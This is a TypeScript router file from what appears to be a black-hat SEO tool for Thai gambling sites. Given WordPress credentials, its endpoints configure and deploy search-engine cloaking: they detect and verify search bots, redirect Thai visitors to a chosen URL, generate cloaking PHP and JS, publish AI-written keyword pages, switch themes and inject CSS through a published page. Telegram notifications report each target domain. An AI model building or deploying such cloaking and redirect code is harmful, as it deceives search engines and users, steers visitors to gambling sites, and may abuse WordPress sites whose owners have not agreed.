/**
 * Cloaking + Advanced SEO Optimization Router
 * 
 * Endpoints for:
 * 1. Cloaking settings management (bot detection, Thai user redirect)
 * 2. AI on-page SEO optimization (full Google Algorithm compliance)
 * 3. SEO theme selection and deployment
 * 4. SEO audit and scoring
 */

import { z } from "zod";
import { router, protectedProcedure } from "../_core/trpc";
import {
  type CloakingConfig,
  DEFAULT_CLOAKING_CONFIG,
  SEARCH_ENGINE_BOTS,
  isSearchBot,
  identifyBot,
  isGoogleBotIp,
  generateCloakingPHP,
  generateCloakingJS,
  deployFullCloaking,
  type CloakingDeployResult,
} from "../wp-cloaking-engine";
import {
  type SeoOptimizationInput,
  type OptimizedPage,
  generateOptimizedPage,
  runSeoAudit,
  deployOptimizedPageToWP,
  optimizeWpSiteSettings,
  selectSeoTheme,
  SEO_OPTIMIZED_THEMES,
  generateHtaccessRules,
  generateRobotsTxt,
  type AuditInput,
} from "../ai-onpage-seo-optimizer";
import * as db from "../db";
import { sendTelegramNotification, type TelegramNotification } from "../telegram-notifier";

// ═══ Theme Mapping: our custom slugs → real WP theme slugs ═══
const THEME_MAPPING_REVERSE: Record<string, string> = {
  "neon-jackpot": "flavor",
  "royal-spin": "flavor",
  "cyber-slots": "flavor",
  "lucky-fortune": "flavor",
  "golden-lottery": "flavor",
  "mega-draw": "flavor",
  "casino-royale": "flavor",
  "vegas-night": "flavor",
  "poker-pro": "flavor",
  "card-shark": "flavor",
  "baccarat-elite": "flavor",
  "golden-table": "flavor",
  "sports-arena": "flavor",
  "bet-champion": "flavor",
  "fortune-wheel": "flavor",
  "jackpot-city": "flavor",
};

// ═══ Apply Custom CSS to WP via Additional CSS or Custom HTML widget ═══
async function applyCustomCss(siteUrl: string, auth: string, css: string): Promise<boolean> {
  const headers = { Authorization: `Basic ${auth}`, "Content-Type": "application/json" };
  
  // Method 1: Try via WP Customizer Additional CSS (custom_css custom post type)
  try {
    // Get current active stylesheet
    const settingsRes = await fetch(`${siteUrl}/wp-json/wp/v2/settings`, { headers });
    if (settingsRes.ok) {
      const settings = await settingsRes.json();
      const stylesheet = settings.stylesheet || "flavor";
      
      // Check if custom_css post exists for this theme
      const cssPostRes = await fetch(`${siteUrl}/wp-json/wp/v2/custom_css?slug=${stylesheet}`, { headers });
      if (cssPostRes.ok) {
        const cssPosts = await cssPostRes.json();
        if (cssPosts.length > 0) {
          // Update existing
          await fetch(`${siteUrl}/wp-json/wp/v2/custom_css/${cssPosts[0].id}`, {
            method: "PUT", headers,
            body: JSON.stringify({ content: { raw: css } }),
          });
          return true;
        }
      }
      // Create new custom_css post
      const createRes = await fetch(`${siteUrl}/wp-json/wp/v2/custom_css`, {
        method: "POST", headers,
        body: JSON.stringify({ title: stylesheet, content: { raw: css }, status: "publish" }),
      });
      if (createRes.ok) return true;
    }
  } catch { /* fallthrough */ }
  
  // Method 2: Inject via a page/post with CSS
  try {
    // Create a hidden page with inline CSS
    const pageRes = await fetch(`${siteUrl}/wp-json/wp/v2/pages`, {
      method: "POST", headers,
      body: JSON.stringify({
        title: "Theme Customization",
        slug: "theme-custom-css",
        status: "publish",
        content: `<!-- wp:html --><style>${css}</style><!-- /wp:html -->`,
      }),
    });
    return pageRes.ok;
  } catch {
    return false;
  }
}

// ═══ Generate Theme-Specific CSS based on our theme slug ═══
function generateThemeCss(themeSlug: string, customization?: {
  primaryColor?: string;
  secondaryColor?: string;
  accentColor?: string;
  fontFamily?: string;
  headingFont?: string;
  borderRadius?: string;
}): string {
  // Base theme styles based on our custom theme definitions
  const THEME_STYLES: Record<string, string> = {
    "neon-jackpot": `
      :root { --primary: #00ff88; --secondary: #ff00ff; --bg: #0a0a0a; }
      body { background: var(--bg); color: #e0e0e0; font-family: 'Orbitron', sans-serif; }
      .site-header, .wp-block-group { background: linear-gradient(135deg, #1a0033, #0a0a2e); border-bottom: 2px solid var(--primary); }
      h1, h2, h3 { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
      a { color: var(--secondary); } a:hover { color: var(--primary); }
      .wp-block-button__link { background: linear-gradient(135deg, var(--primary), var(--secondary)); border-radius: 8px; }
    `,
    "royal-spin": `
      :root { --primary: #ffd700; --secondary: #8b0000; --bg: #1a0a00; }
      body { background: var(--bg); color: #f0e6d2; font-family: 'Playfair Display', serif; }
      .site-header { background: linear-gradient(135deg, #2d1810, #1a0a00); border-bottom: 3px solid var(--primary); }
      h1, h2, h3 { color: var(--primary); font-family: 'Playfair Display', serif; }
      a { color: var(--primary); } .wp-block-button__link { background: var(--primary); color: #1a0a00; }
    `,
    "cyber-slots": `
      :root { --primary: #00f0ff; --secondary: #ff2d95; --bg: #0d0d1a; }
      body { background: var(--bg); color: #c0c0e0; font-family: 'Share Tech Mono', monospace; }
      .site-header { background: rgba(13,13,26,0.95); border-bottom: 1px solid var(--primary); }
      h1, h2, h3 { color: var(--primary); letter-spacing: 2px; }
      .wp-block-button__link { background: linear-gradient(90deg, var(--primary), var(--secondary)); clip-path: polygon(10px 0, 100% 0, calc(100% - 10px) 100%, 0 100%); }
    `,
    "lucky-fortune": `
      :root { --primary: #ff3333; --secondary: #ffd700; --bg: #1a0000; }
      body { background: var(--bg); color: #f0d0d0; font-family: 'Noto Sans Thai', sans-serif; }
      .site-header { background: linear-gradient(135deg, #8b0000, #1a0000); }
      h1, h2, h3 { color: var(--secondary); } a { color: var(--primary); }
      .wp-block-button__link { background: var(--primary); border: 2px solid var(--secondary); }
    `,
    "golden-lottery": `
      :root { --primary: #ffd700; --secondary: #ff6b00; --bg: #0a0a00; }
      body { background: var(--bg); color: #e0d8c0; font-family: 'Kanit', sans-serif; }
      .site-header { background: linear-gradient(135deg, #2d2400, #0a0a00); border-bottom: 3px solid var(--primary); }
      h1, h2, h3 { color: var(--primary); }
      .wp-block-button__link { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: #000; font-weight: bold; }
    `,
  };

  let css = THEME_STYLES[themeSlug] || "";
  
  // Add user customization overrides
  if (customization) {
    const overrides: string[] = [];
    if (customization.primaryColor) overrides.push(`--primary: ${customization.primaryColor};`);
    if (customization.secondaryColor) overrides.push(`--secondary: ${customization.secondaryColor};`);
    if (customization.accentColor) overrides.push(`--accent: ${customization.accentColor};`);
    if (customization.fontFamily) overrides.push(`font-family: ${customization.fontFamily};`);
    if (customization.borderRadius) overrides.push(`--radius: ${customization.borderRadius};`);
    if (overrides.length > 0) {
      css += `\n:root { ${overrides.join(" ")} }`;
    }
    if (customization.headingFont) {
      css += `\nh1, h2, h3, h4, h5, h6 { font-family: ${customization.headingFont}; }`;
    }
  }
  
  return css.trim();
}

// ═══ Custom CSS Generator for Theme Customization (legacy) ═══
function generateCustomCss(customization: {
  primaryColor?: string;
  secondaryColor?: string;
  accentColor?: string;
  fontFamily?: string;
  headingFont?: string;
  borderRadius?: string;
}): string {
  const rules: string[] = [];
  rules.push(':root {');
  if (customization.primaryColor) rules.push(`  --primary-color: ${customization.primaryColor};`);
  if (customization.secondaryColor) rules.push(`  --secondary-color: ${customization.secondaryColor};`);
  if (customization.accentColor) rules.push(`  --accent-color: ${customization.accentColor};`);
  if (customization.fontFamily) rules.push(`  --font-family: ${customization.fontFamily};`);
  if (customization.headingFont) rules.push(`  --heading-font: ${customization.headingFont};`);
  if (customization.borderRadius) rules.push(`  --border-radius: ${customization.borderRadius};`);
  rules.push('}');
  if (customization.fontFamily) {
    rules.push(`body { font-family: ${customization.fontFamily}, sans-serif; }`);
  }
  if (customization.headingFont) {
    rules.push(`h1, h2, h3, h4, h5, h6 { font-family: ${customization.headingFont}, sans-serif; }`);
  }
  if (customization.primaryColor) {
    rules.push(`a, .btn-primary, .wp-block-button__link { color: ${customization.primaryColor}; }`);
    rules.push(`.btn-primary, .wp-block-button__link { background-color: ${customization.primaryColor}; border-color: ${customization.primaryColor}; }`);
  }
  if (customization.accentColor) {
    rules.push(`.accent, .highlight, .badge { background-color: ${customization.accentColor}; }`);
  }
  if (customization.borderRadius) {
    rules.push(`.card, .btn, .wp-block-button__link, img { border-radius: ${customization.borderRadius}; }`);
  }
  return rules.length > 2 ? rules.join('\n') : '';
}

// ═══ In-memory cloaking configs per project ═══
const cloakingConfigs = new Map<number, CloakingConfig>();

// ═══ Cloaking Router ═══
export const cloakingRouter = router({
  /** Get cloaking config for a project */
  getConfig: protectedProcedure
    .input(z.object({ projectId: z.number() }))
    .query(({ input }) => {
      return cloakingConfigs.get(input.projectId) || { ...DEFAULT_CLOAKING_CONFIG };
    }),

  /** Update cloaking config */
  updateConfig: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      config: z.object({
        redirectUrl: z.string().optional(),
        redirectUrls: z.array(z.string()).optional(),
        enabled: z.boolean().optional(),
        redirectMethod: z.enum(["js", "meta", "302", "301"]).optional(),
        redirectDelay: z.number().min(0).max(10000).optional(),
        targetCountries: z.array(z.string()).optional(),
        verifyBotIp: z.boolean().optional(),
        customBotHead: z.string().optional(),
        customRedirectHead: z.string().optional(),
      }),
    }))
    .mutation(({ input }) => {
      const existing = cloakingConfigs.get(input.projectId) || { ...DEFAULT_CLOAKING_CONFIG };
      const updated: CloakingConfig = {
        ...existing,
        ...input.config,
        allowedBots: existing.allowedBots, // keep default bots
      };
      cloakingConfigs.set(input.projectId, updated);
      return { success: true, config: updated };
    }),

  /** Deploy cloaking to a WordPress site */
  deploy: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
    }))
    .mutation(async ({ input }) => {
      const config = cloakingConfigs.get(input.projectId);
      if (!config || !config.enabled) {
        return { success: false, detail: "Cloaking not configured or disabled" };
      }

      const result = await deployFullCloaking(
        {
          siteUrl: input.domain.startsWith("http") ? input.domain : `https://${input.domain}`,
          username: input.wpUsername,
          appPassword: input.wpAppPassword,
        },
        config,
      );

      // Notify via Telegram
      if (result.success) {
        try {
          await sendTelegramNotification({
            type: "info",
            targetUrl: input.domain,
            details: `🕵️ Cloaking Deployed\n🌐 ${input.domain}\n🔀 Redirect: ${config.redirectUrl}\n🎯 Countries: ${config.targetCountries.join(", ")}\n📋 Method: ${config.redirectMethod}\n✅ ${result.methods.filter(m => m.success).length}/${result.methods.length} methods succeeded`,
          });
        } catch {}
      }

      return result;
    }),

  /** Generate cloaking code (PHP + JS) without deploying */
  generateCode: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      format: z.enum(["php", "js", "both"]).default("both"),
    }))
    .query(({ input }) => {
      const config = cloakingConfigs.get(input.projectId) || { ...DEFAULT_CLOAKING_CONFIG };
      const result: { php?: string; js?: string } = {};
      
      if (input.format === "php" || input.format === "both") {
        result.php = generateCloakingPHP(config);
      }
      if (input.format === "js" || input.format === "both") {
        result.js = generateCloakingJS(config);
      }
      
      return result;
    }),

  /** Test bot detection */
  testBotDetection: protectedProcedure
    .input(z.object({
      userAgent: z.string(),
      ip: z.string().optional(),
    }))
    .query(({ input }) => {
      return {
        isBot: isSearchBot(input.userAgent),
        botName: identifyBot(input.userAgent),
        isGoogleIp: input.ip ? isGoogleBotIp(input.ip) : null,
      };
    }),

  /** Get list of supported bots */
  getSupportedBots: protectedProcedure.query(() => {
    return SEARCH_ENGINE_BOTS;
  }),
});

// ═══ On-Page SEO Optimizer Router ═══
export const onPageSeoRouter = router({
  /** Generate fully optimized page content */
  generateOptimized: protectedProcedure
    .input(z.object({
      domain: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      language: z.string().default("th"),
      country: z.string().default("TH"),
      niche: z.string(),
      brandName: z.string(),
      existingContent: z.string().optional(),
      authorName: z.string().optional(),
      authorCredentials: z.string().optional(),
      organizationName: z.string().optional(),
      logoUrl: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const seoInput: SeoOptimizationInput = {
        domain: input.domain,
        primaryKeyword: input.primaryKeyword,
        secondaryKeywords: input.secondaryKeywords,
        language: input.language,
        country: input.country,
        niche: input.niche,
        brandName: input.brandName,
        existingContent: input.existingContent,
        author: input.authorName ? {
          name: input.authorName,
          credentials: input.authorCredentials || "",
          bio: "",
        } : undefined,
        organization: input.organizationName ? {
          name: input.organizationName,
          logoUrl: input.logoUrl,
        } : undefined,
      };

      const result = await generateOptimizedPage(seoInput);

      // Notify via Telegram
      try {
        await sendTelegramNotification({
          type: "info",
          targetUrl: input.domain,
          details: `📝 AI SEO Content Generated\n🌐 ${input.domain}\n🎯 Keyword: ${input.primaryKeyword}\n📊 SEO Score: ${result.seoScore}/100\n📄 ${result.wordCount} words\n🏗️ ${result.schemas.length} schema types\n✅ ${result.seoChecks.filter(c => c.status === "pass").length}/${result.seoChecks.length} checks passed`,
        });
      } catch {}

      return result;
    }),

  /** Run SEO audit on existing content */
  audit: protectedProcedure
    .input(z.object({
      title: z.string(),
      metaDescription: z.string(),
      h1: z.string(),
      content: z.string(),
      slug: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      headings: z.array(z.object({ level: z.number(), text: z.string() })).default([]),
      schemas: z.array(z.any()).default([]),
      images: z.array(z.object({ alt: z.string(), src: z.string() })).default([]),
      internalLinks: z.array(z.object({ anchor: z.string(), url: z.string() })).default([]),
      authorName: z.string().optional(),
      authorCredentials: z.string().optional(),
    }))
    .query(({ input }) => {
      const wordCount = input.content.replace(/<[^>]*>/g, "").split(/\s+/).filter(Boolean).length;
      
      const auditInput: AuditInput = {
        title: input.title,
        metaDescription: input.metaDescription,
        h1: input.h1,
        headings: input.headings,
        content: input.content,
        slug: input.slug,
        primaryKeyword: input.primaryKeyword,
        secondaryKeywords: input.secondaryKeywords,
        schemas: input.schemas,
        images: input.images,
        internalLinks: input.internalLinks,
        wordCount,
        author: input.authorName ? { name: input.authorName, credentials: input.authorCredentials || "" } : undefined,
      };

      return runSeoAudit(auditInput);
    }),

  /** Deploy optimized content to WordPress */
  deployToWP: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      language: z.string().default("th"),
      niche: z.string(),
      brandName: z.string(),
      asPage: z.boolean().default(false),
      authorName: z.string().optional(),
      authorCredentials: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      // Step 1: Generate optimized content
      const seoInput: SeoOptimizationInput = {
        domain: input.domain,
        primaryKeyword: input.primaryKeyword,
        secondaryKeywords: input.secondaryKeywords,
        language: input.language,
        country: "TH",
        niche: input.niche,
        brandName: input.brandName,
        author: input.authorName ? {
          name: input.authorName,
          credentials: input.authorCredentials || "",
          bio: "",
        } : undefined,
      };

      const page = await generateOptimizedPage(seoInput);

      // Step 2: Deploy to WordPress
      const siteUrl = input.domain.startsWith("http") ? input.domain : `https://${input.domain}`;
      const deployResult = await deployOptimizedPageToWP(
        { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
        page,
        input.asPage,
      );

      // Step 3: Optimize site settings
      await optimizeWpSiteSettings(
        { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
        seoInput,
      );

      // Notify
      if (deployResult.success) {
        try {
          await sendTelegramNotification({
            type: "info",
            targetUrl: input.domain,
            details: `🚀 SEO Content Deployed to WP\n🌐 ${input.domain}\n🎯 ${input.primaryKeyword}\n📊 SEO Score: ${page.seoScore}/100\n📄 ${page.wordCount} words\n🔗 ${deployResult.url || "Published"}`,
          });
        } catch {}
      }

      return {
        ...deployResult,
        seoScore: page.seoScore,
        wordCount: page.wordCount,
        checksTotal: page.seoChecks.length,
        checksPassed: page.seoChecks.filter(c => c.status === "pass").length,
      };
    }),

  /** Generate .htaccess rules for SEO */
  getHtaccessRules: protectedProcedure.query(() => {
    return generateHtaccessRules();
  }),

  /** Generate robots.txt for a domain */
  getRobotsTxt: protectedProcedure
    .input(z.object({ domain: z.string(), sitemapUrl: z.string().optional() }))
    .query(({ input }) => {
      return generateRobotsTxt(input.domain, input.sitemapUrl);
    }),
});

// ═══ SEO Theme Router ═══
export const seoThemeRouter = router({
  /** List all SEO-optimized themes */
  list: protectedProcedure.query(() => {
    return SEO_OPTIMIZED_THEMES;
  }),

  /** Select best theme based on criteria */
  select: protectedProcedure
    .input(z.object({
      preferTier: z.number().min(1).max(4).optional(),
      minSpeedScore: z.number().min(0).max(100).optional(),
      requireSchema: z.boolean().optional(),
      randomize: z.boolean().default(false),
    }))
    .query(({ input }) => {
      return selectSeoTheme(input);
    }),

  /** Deploy selected theme to WordPress */
  deployTheme: protectedProcedure
    .input(z.object({
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
      themeSlug: z.string(),
      customization: z.object({
        primaryColor: z.string().optional(),
        secondaryColor: z.string().optional(),
        accentColor: z.string().optional(),
        fontFamily: z.string().optional(),
        headingFont: z.string().optional(),
        borderRadius: z.string().optional(),
      }).optional(),
    }))
    .mutation(async ({ input }) => {
      const siteUrl = input.domain.startsWith("http") ? input.domain : `https://${input.domain}`;
      const auth = Buffer.from(`${input.wpUsername}:${input.wpAppPassword}`).toString("base64");
      const headers = { Authorization: `Basic ${auth}`, "Content-Type": "application/json" };
      const steps: string[] = [];

      try {
        // Step 1: List installed themes to check if target theme exists
        let installedThemes: any[] = [];
        try {
          const listRes = await fetch(`${siteUrl}/wp-json/wp/v2/themes`, { headers });
          if (listRes.ok) {
            installedThemes = await listRes.json();
            steps.push(`พบ ${installedThemes.length} themes ติดตั้งแล้ว`);
          }
        } catch { /* ignore */ }

        const themeExists = installedThemes.some((t: any) => 
          t.stylesheet === input.themeSlug || 
          t.template === input.themeSlug ||
          (t.name && t.name.toLowerCase().includes(input.themeSlug.toLowerCase()))
        );

        // Step 2: If theme not installed, try to install from wordpress.org
        if (!themeExists) {
          steps.push(`Theme "${input.themeSlug}" ไม่พบ — ลองติดตั้งจาก wordpress.org`);
          
          // Map our custom theme slugs to real WP themes
          const THEME_MAPPING: Record<string, string> = {
            // Slots themes
            "neon-jackpot": "flavor",
            "royal-spin": "flavor",
            "cyber-slots": "flavor",
            "lucky-fortune": "flavor",
            // Lottery themes
            "golden-lottery": "flavor",
            "mega-draw": "flavor",
            // Casino themes
            "casino-royale": "flavor",
            "vegas-night": "flavor",
            // Poker themes
            "poker-pro": "flavor",
            "card-shark": "flavor",
            // Baccarat themes
            "baccarat-elite": "flavor",
            "golden-table": "flavor",
            // Sports themes
            "sports-arena": "flavor",
            "bet-champion": "flavor",
            // General gambling
            "fortune-wheel": "flavor",
            "jackpot-city": "flavor",
          };

          // Determine actual WP theme to install
          const wpThemeSlug = THEME_MAPPING[input.themeSlug] || input.themeSlug;
          
          // Try installing via WP REST API (requires install-themes capability)
          try {
            const installRes = await fetch(`${siteUrl}/wp-json/wp/v2/themes`, {
              method: "POST",
              headers,
              body: JSON.stringify({ slug: wpThemeSlug, status: "inactive" }),
            });
            if (installRes.ok) {
              steps.push(`ติดตั้ง theme "${wpThemeSlug}" สำเร็จ`);
            } else {
              const errText = await installRes.text();
              steps.push(`ติดตั้งไม่ได้: ${errText.substring(0, 100)}`);
              
              // Fallback: try to find a suitable theme already installed
              const activeTheme = installedThemes.find((t: any) => t.status === "active");
              if (activeTheme) {
                steps.push(`ใช้ theme ที่มีอยู่แล้ว: "${activeTheme.stylesheet}" + custom CSS`);
                // Apply custom CSS to existing theme instead
                const customCss = generateThemeCss(input.themeSlug, input.customization);
                if (customCss) {
                  await applyCustomCss(siteUrl, auth, customCss);
                  steps.push(`ใส่ custom CSS เลียนแบบ theme สำเร็จ`);
                }
                return { success: true, detail: steps.join(" \u2192 "), fallback: true };
              }
            }
          } catch (installErr: any) {
            steps.push(`Install error: ${installErr.message}`);
          }
        } else {
          steps.push(`Theme "${input.themeSlug}" พบแล้ว`);
        }

        // Step 3: Activate the theme
        const activateSlug = themeExists ? input.themeSlug : (THEME_MAPPING_REVERSE[input.themeSlug] || input.themeSlug);
        const activateRes = await fetch(
          `${siteUrl}/wp-json/wp/v2/themes/${activateSlug}`,
          { method: "PUT", headers, body: JSON.stringify({ status: "active" }) },
        );

        if (!activateRes.ok) {
          // Try POST as fallback
          const altRes = await fetch(
            `${siteUrl}/wp-json/wp/v2/themes/${activateSlug}`,
            { method: "POST", headers, body: JSON.stringify({ status: "active" }) },
          );
          if (!altRes.ok) {
            // Last resort: try activating via switch-theme endpoint
            const switchRes = await fetch(
              `${siteUrl}/wp-json/wp/v2/settings`,
              { method: "POST", headers, body: JSON.stringify({ stylesheet: activateSlug, template: activateSlug }) },
            );
            if (!switchRes.ok) {
              steps.push(`Activate ล้มเหลว — ใช้ custom CSS แทน`);
              // Apply CSS styling to mimic the theme on whatever theme is active
              const customCss = generateThemeCss(input.themeSlug, input.customization);
              if (customCss) {
                await applyCustomCss(siteUrl, auth, customCss);
                steps.push(`ใส่ custom CSS เลียนแบบ theme สำเร็จ`);
                return { success: true, detail: steps.join(" \u2192 "), fallback: true };
              }
              return { success: false, detail: steps.join(" \u2192 ") };
            }
          }
        }
        steps.push(`Activate theme สำเร็จ`);

        // Step 4: Apply customization CSS
        const customCss = generateThemeCss(input.themeSlug, input.customization);
        if (customCss) {
          await applyCustomCss(siteUrl, auth, customCss);
          steps.push(`ใส่ custom CSS`);
        }

        return { success: true, detail: steps.join(" \u2192 ") };
      } catch (err: any) {
        return { success: false, detail: `Error: ${err.message}. Steps: ${steps.join(" \u2192 ")}` };
      }
    }),
});

// ═══ Full SEO + Cloaking Pipeline ═══
export const seoFullPipelineRouter = router({
  /** Run complete SEO optimization + cloaking pipeline for a project */
  runFullPipeline: protectedProcedure
    .input(z.object({
      projectId: z.number(),
      domain: z.string(),
      wpUsername: z.string(),
      wpAppPassword: z.string(),
      primaryKeyword: z.string(),
      secondaryKeywords: z.array(z.string()).default([]),
      niche: z.string(),
      brandName: z.string(),
      language: z.string().default("th"),
      // Cloaking settings
      cloakingEnabled: z.boolean().default(false),
      redirectUrl: z.string().optional(),
      redirectMethod: z.enum(["js", "meta", "302", "301"]).default("js"),
      targetCountries: z.array(z.string()).default(["TH"]),
    }))
    .mutation(async ({ input }) => {
      const siteUrl = input.domain.startsWith("http") ? input.domain : `https://${input.domain}`;
      const results: { step: string; success: boolean; detail: string; data?: any }[] = [];

      // Step 1: Auto-select and deploy SEO theme based on niche/keywords
      try {
        // Auto-detect casino category from niche/keywords
        const nicheLower = (input.niche + ' ' + input.primaryKeyword + ' ' + input.secondaryKeywords.join(' ')).toLowerCase();
        let autoCategory: string | undefined;
        if (/สล็อต|slot|spin|jackpot|สปิน/.test(nicheLower)) {
          autoCategory = 'slots';
        } else if (/หวย|lottery|lotto|ลอตเตอรี่|ตัวเลข/.test(nicheLower)) {
          autoCategory = 'lottery';
        } else if (/บาคาร่า|baccarat|ไพ่|เสือมังกร|dragon.*tiger|คาสิโน|casino/.test(nicheLower)) {
          autoCategory = 'baccarat';
        }
        const theme = selectSeoTheme({ preferTier: 1, preferCategory: autoCategory, randomize: true });
        const auth = Buffer.from(`${input.wpUsername}:${input.wpAppPassword}`).toString("base64");
        
        const themeRes = await fetch(`${siteUrl}/wp-json/wp/v2/themes/${theme.slug}`, {
          method: "PUT",
          headers: { Authorization: `Basic ${auth}`, "Content-Type": "application/json" },
          body: JSON.stringify({ status: "active" }),
        });
        
        results.push({
          step: "theme",
          success: themeRes.ok,
          detail: themeRes.ok ? `Activated: ${theme.name} [${autoCategory || 'auto'}] (Speed: ${theme.speedScore})` : `Theme activation failed`,
          data: theme,
        });
      } catch (err: any) {
        results.push({ step: "theme", success: false, detail: err.message });
      }

      // Step 2: Generate and deploy optimized content
      try {
        const seoInput: SeoOptimizationInput = {
          domain: input.domain,
          primaryKeyword: input.primaryKeyword,
          secondaryKeywords: input.secondaryKeywords,
          language: input.language,
          country: "TH",
          niche: input.niche,
          brandName: input.brandName,
        };

        const page = await generateOptimizedPage(seoInput);
        const deployResult = await deployOptimizedPageToWP(
          { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
          page,
          true, // as page
        );

        results.push({
          step: "seo_content",
          success: deployResult.success,
          detail: `SEO Score: ${page.seoScore}/100, ${page.wordCount} words. ${deployResult.detail}`,
          data: { seoScore: page.seoScore, wordCount: page.wordCount, postId: deployResult.postId },
        });
      } catch (err: any) {
        results.push({ step: "seo_content", success: false, detail: err.message });
      }

      // Step 3: Optimize site settings
      try {
        const settingsResult = await optimizeWpSiteSettings(
          { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
          {
            domain: input.domain,
            primaryKeyword: input.primaryKeyword,
            secondaryKeywords: input.secondaryKeywords,
            language: input.language,
            country: "TH",
            niche: input.niche,
            brandName: input.brandName,
          },
        );
        results.push({ step: "site_settings", success: settingsResult.success, detail: settingsResult.detail });
      } catch (err: any) {
        results.push({ step: "site_settings", success: false, detail: err.message });
      }

      // Step 4: Deploy cloaking (if enabled)
      if (input.cloakingEnabled && input.redirectUrl) {
        try {
          const cloakConfig: CloakingConfig = {
            ...DEFAULT_CLOAKING_CONFIG,
            redirectUrl: input.redirectUrl,
            enabled: true,
            redirectMethod: input.redirectMethod,
            targetCountries: input.targetCountries,
          };

          // Save config
          cloakingConfigs.set(input.projectId, cloakConfig);

          const cloakResult = await deployFullCloaking(
            { siteUrl, username: input.wpUsername, appPassword: input.wpAppPassword },
            cloakConfig,
          );

          results.push({
            step: "cloaking",
            success: cloakResult.success,
            detail: `Cloaking ${cloakResult.success ? "deployed" : "failed"}. ${cloakResult.methods.filter(m => m.success).length}/${cloakResult.methods.length} methods.`,
            data: { methods: cloakResult.methods },
          });
        } catch (err: any) {
          results.push({ step: "cloaking", success: false, detail: err.message });
        }
      }

      // Telegram notification
      const successCount = results.filter(r => r.success).length;
      try {
        await sendTelegramNotification({
          type: "info",
          targetUrl: input.domain,
          details: `🔧 Full SEO Pipeline Complete\n🌐 ${input.domain}\n🎯 ${input.primaryKeyword}\n📊 ${successCount}/${results.length} steps succeeded\n` + results.map(r => `${r.success ? "✅" : "❌"} ${r.step}: ${r.detail.slice(0, 60)}`).join("\n"),
        });
      } catch {}

      return {
        success: successCount > 0,
        totalSteps: results.length,
        successSteps: successCount,
        results,
      };
    }),
});
